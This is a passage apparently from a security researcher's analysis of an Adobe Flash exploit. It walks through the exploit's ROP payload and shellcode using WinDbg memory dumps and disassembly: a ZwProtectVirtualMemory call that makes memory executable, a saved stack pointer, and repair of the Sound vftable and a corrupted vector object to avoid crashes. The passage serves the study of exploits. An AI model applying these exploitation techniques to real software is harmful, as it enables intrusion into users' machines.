
â€¢
ROP and Shellcode The ROP payload basically tries to make memory at 0x18184000 executable, and to return to 0x1818411c to execute the shellcode.
0:008>
dds eax 18184100  770b5f58 ntdll!ZwProtectVirtualMemory 18184104  1818411c 18184108  ffffffff 1818410c  181840e8 18184110  181840ec 18184114  00000040 18184118  181840e4 Inside the shellcode, it saves the current stack pointer to 0x18181800 to safely return to the caller.
mov     dword ptr ds:[18181800h],ebp
Then, it restores the flash.
Media.
Sound vftable and repairs the corrupted vector object to avoid application crashes.
18184123 b820609f06      mov     eax,69F6020h 18184128 90              nop 18184129 90              nop 1818412a c700c0f22169    mov     dword ptr [eax],offset Flash32_11_7_700_261!AdobeCPGetAPI+0x42ac00 (6921f2c0) 18184133